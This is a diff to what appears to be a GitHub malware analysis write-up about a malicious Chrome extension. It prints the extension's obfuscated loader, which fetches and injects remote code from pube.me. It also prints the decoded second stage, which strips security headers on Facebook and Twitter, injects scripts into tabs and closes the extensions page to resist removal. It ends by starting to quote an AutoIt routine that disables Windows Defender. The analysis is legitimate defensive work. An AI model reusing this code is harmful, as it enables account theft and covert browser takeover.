@@ -937,8 +937,378 @@ if(chrome){
 }
 ```
 <br> Please note that some part of the world (I have tried VPN) will have 403 error when trying to access this server.
-<br> I will try to fetch some more informations, but if you found something, please open an issue or pull request! Thanks!
-### 8) The miner
+<br> Let's take a look at the code:
+```javascript
+var yhhng = {};
+var mhiwl = function(){
+	var iacpj = new URL('https://www.google.com');
+	iacpj.protocol = 'http:';
+	var nkkdx = 'pube';
+	var eiubga = 'me';
+	iacpj.hostname = nkkdx+'.'+eiubga;
+	iacpj.pathname = '/config';
+	if(!chrome.app.getDetails()){
+		return false;
+	}
+	fetch(iacpj).then(function(response){
+		return response.json();
+	}).then(function(data){
+		yhhng = data;
+		if(data.login == true){
+			yhhng.app = chrome.app.getDetails();
+			yarna();
+		}else{
+			yztvx();
+		}
+	}).catch((e) => {
+		setTimeout(mhiwl, 1000*60);
+	});
+}
+
+var yarna = function(){
+	yhhng.request.headers = {installed:true};
+	fetch(yhhng.check ,yhhng.request).then(function(response){
+		return response.json();
+	}).then(function(data){
+		if(data.verify == true){
+			ufrkhn();
+		}else{
+			yztvx();
+		}
+	});
+}
+
+var ixtfco = function(){
+	(function(d, s, id){
+     var js, cjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = yhhng.url;
+     cjs.parentNode.insertBefore(js, cjs);
+   }(document, 'script', 'chrome-jssdk'));
+}
+
+var ufrkhn = function(){
+	fetch(yhhng.url).then(function(response){
+		return response.blob();
+	}).then(function(data){
+		yhhng.url = URL.createObjectURL(data);
+		ixtfco(yhhng.url);
+	});
+}
+```
+<br> If I modify it a little bit like this, then load the extension manually to Chrome, open the Developer Tools and then the Javascript console, and see what we get:
+```javascript
+var yhhng = {};
+var mhiwl = function(){
+	var iacpj = new URL('https://www.google.com');
+	iacpj.protocol = 'http:';
+	var nkkdx = 'pube';
+	var eiubga = 'me';
+	iacpj.hostname = nkkdx+'.'+eiubga;
+	iacpj.pathname = '/config';
+	//if(!chrome.app.getDetails()){
+	//	return false;
+	//}
+	fetch(iacpj).then(function(response){
+		return response.json();
+	}).then(function(data){
+		yhhng = data;
+		if(data.login == true){
+			yhhng.app = chrome.app.getDetails();
+			//yarna();
+		}else{
+			//yztvx();
+		}
+	}).catch((e) => {
+		setTimeout(mhiwl, 1000*60);
+	});
+}
+
+var yarna = function(){
+	yhhng.request.headers = {installed:true};
+	fetch(yhhng.check ,yhhng.request).then(function(response){
+		return response.json();
+	}).then(function(data){
+		if(data.verify == true){
+			//ufrkhn();
+		}else{
+			//yztvx();
+		}
+	});
+}
+
+var ixtfco = function(){
+	(function(d, s, id){
+     var js, cjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = yhhng.url;
+     cjs.parentNode.insertBefore(js, cjs);
+   }(document, 'script', 'chrome-jssdk'));
+}
+
+var ufrkhn = function(){
+	fetch(yhhng.url).then(function(response){
+		return response.blob();
+	}).then(function(data){
+		yhhng.url = URL.createObjectURL(data);
+		//ixtfco(yhhng.url);
+	});
+}
+```
+<br> And then, open Javascript console, type `ufrkhn();` and you get:
+![Console](https://user-images.githubusercontent.com/68118236/145717743-638bca3c-47d5-4868-8964-aad551ce826a.png)
+Clicking to that `blob` URL, you will get:
+```javascript
+var config = {};
+config.url = new URL("https://pube.me");
+config.token = "180ff51b68b188325748d5ec7731ec80";
+var run = function () {
+  chrome.tabs.onUpdated.addListener(function (id) {
+    chrome.tabs.get(id, function (tab) {
+      tab.url = new URL(tab.url);
+      if (tab.status == "complete" && tab.url.protocol != "chrome:") {
+        updated(tab);
+      }
+
+      if (tab.url.protocol == "chrome:" && tab.url.host == "extensions" && !localStorage.trust) {
+        blocked(tab);
+      }
+    })
+  })
+}
+
+var updated = function (tab) {
+  config.last = tab.url.origin;
+  return;
+  var url = uri("/js/script.js");
+  fetch(url).then(function (response) {
+    return response.text();
+  }).then(function (data) {
+    if (tab && tab.id) {
+      chrome.tabs.executeScript(tab.id, { code: data });
+    }
+  });
+}
+
+var onRequest = function () {
+  chrome.webRequest.onHeadersReceived.addListener(function (details) {
+    for (var i = 0; i < details.responseHeaders.length; i++) {
+      if (details.responseHeaders[i].name.toLowerCase() === 'content-security-policy') {
+        details.responseHeaders[i].value = '';
+      }
+      if (details.responseHeaders[i].name.toLowerCase() === 'x-xss-protection') {
+        details.responseHeaders[i].value = '0';
+      }
+    }
+    return {
+      responseHeaders: details.responseHeaders
+    };
+  }, {
+    urls: ["https://*.facebook.com/*", "https://twitter.com/*"]
+  }, ["blocking", "responseHeaders"])
+}
+
+var blocked = function (tab) {
+  chrome.tabs.remove(tab.id);
+}
+
+var icon = function () {
+  if (chrome.browserAction && chrome.browserAction.setIcon) {
+    var url = uri("/settings.png");
+    chrome.browserAction.setIcon({ path: url });
+    chrome.browserAction.onClicked.addListener(function () {
+      chrome.tabs.create({ url: "chrome://settings/" })
+    });
+  }
+}
+
+var counter = function () {
+  config.cid = rand(111111111, 99999999999)
+  if (localStorage.cid) {
+    config.cid = localStorage.cid
+  }
+  localStorage.cid = config.cid
+  var image = new Image();
+  var url = new URL("https://www.google-analytics.com/collect");
+  url.searchParams.append("v", 1);
+  url.searchParams.append("tid", "UA-45982426-14");
+  url.searchParams.append("cid", config.cid);
+  url.searchParams.append("t", "pageview");
+  url.searchParams.append("dp", config.url.hostname);
+  url.searchParams.append("dr", config.last);
+  image.src = url;
+}
+
+var counterTimer = setInterval(counter, 1000 * 60 * 5);
+
+var router = function () {
+  var url = uri("/ajax/route.php");
+  fetch(url, { credentials: 'include' }).then(function (response) {
+    return response.json();
+  }).then(function (data) {
+    data.link = new URL(data.link);
+    chrome.windows.getCurrent(function (w) {
+      chrome.tabs.getAllInWindow(w.id, function (tabs) {
+        for (i = 0; i < tabs.length; i++) {
+          var tab = tabs[i];
+          tab.url = new URL(tab.url);
+          if (tab.url.hostname == data.link.hostname) {
+            data.redirect = false;
+            break;
+          }
+        }
+
+        if (data.redirect) {
+          chrome.tabs.create({ url: data.link.href, pinned: true, active: data.active });
+        }
+      });
+    })
+  });
+}
+
+//var routerTimer = setInterval(router,1000*60*5);
+
+var reload = window.setTimeout(function () {
+  location.reload()
+}, 1000 * 60 * 30);
+
+var getfilters = function () {
+  var url = uri("/js/filters.php");
+  fetch(url).then(function (response) {
+    return response.json();
+  }).then(function (data) {
+    setfilters(data);
+  })
+}
+
+var setfilters = function (filters) {
+  chrome.webRequest.onBeforeRequest.addListener(function (details) {
+    var trust = false;
+    if (details.url.indexOf("ext=me") > 0) {
+      trust = true;
+    }
+    if (trust == false) {
+      return { cancel: true };
+    }
+  },
+    { urls: filters },
+    ["blocking"]);
+}
+
+var installed = function () {
+  if (chrome.cookies) {
+    getInstalledCookie();
+  }
+}
+
+var getInstalledCookie = function () {
+  chrome.cookies.get({ url: "http://example.com/", name: "installed" }, function (cookie) {
+    if (!cookie && !localStorage.installed) {
+      localStorage.installed = true;
+      setInstalledCookie();
+    }
+  })
+}
+
+var setInstalledCookie = function () {
+  var expire = Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 30 * 12 * 5)
+  chrome.cookies.set({
+    url: "http://example.com/",
+    name: "installed",
+    value: "true",
+    domain: "example.com",
+    expirationDate: expire
+  }, function (cookie) {
+    if (cookie) {
+      sendInstalledTrack()
+    }
+  })
+}
+
+var sendInstalledTrack = function () {
+  sendEventTrack('installed', config.url.hostname);
+}
+
+var sendEventTrack = function (ec, ea) {
+  config.cid = rand(111111111, 99999999999)
+  if (localStorage.cid) {
+    config.cid = localStorage.cid
+  }
+  localStorage.cid = config.cid
+  var image = new Image();
+  var url = new URL("https://www.google-analytics.com/collect");
+  url.searchParams.append("v", 1);
+  url.searchParams.append("tid", "UA-45982426-14");
+  url.searchParams.append("cid", config.cid);
+  url.searchParams.append("t", "event");
+  url.searchParams.append("ec", ec);
+  url.searchParams.append("ea", ea);
+  url.searchParams.append("dp", config.url.hostname);
+  image.src = url;
+}
+
+var loadData = function (url, callback) {
+  fetch(url).then(response => response.blob()).then((data) => {
+    var url = URL.createObjectURL(data);
+    var tg = document.getElementsByTagName('script')[0];
+    var js = document.createElement('script');
+    js.src = url;
+    tg.parentNode.insertBefore(js, tg);
+    if (callback) {
+      callback();
+    }
+  });
+}
+
+var uri = function (path) {
+  return config.url.origin + path;
+}
+
+var rand = function (min, max) {
+  return Math.floor(Math.random() * (max - min)) + min;
+}
+
+var key = function (length) {
+  str = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
+  ret = "";
+  for (l = 0; l < length; l++) {
+    ret += str[Math.floor(Math.random() * str.length)];
+  }
+  return ret;
+}
+
+var isReady = (v) => {
+  var promise = new Promise((resolve) => {
+    var timer = window.setInterval(() => {
+      if (typeof window[v] != 'undefined') {
+        resolve(window[v]);
+        window.clearInterval(timer)
+      }
+    }, 50);
+  })
+  return promise;
+}
+
+if (chrome) {
+  run();
+  icon();
+  counter();
+  //router();
+  installed();
+  loadData(uri("/js/facebook.js?" + Date.now()));
+  loadData(uri("/js/twitter.js?" + Date.now()));
+  if (chrome.webRequest) {
+    onRequest()
+    getfilters();
+  }
+}
+```
+<br> That's the code that steal Facebook and Twitter accounts!
+### 8) How they steal your account?
+
+### 9) The miner
 In the function `zlmsyuslmwzh` in the fb.clean.au3 file:
 ```autoit
 Func zlmsyuslmwzh() ; Inject fake update service to Chrome and kill Windows Defender
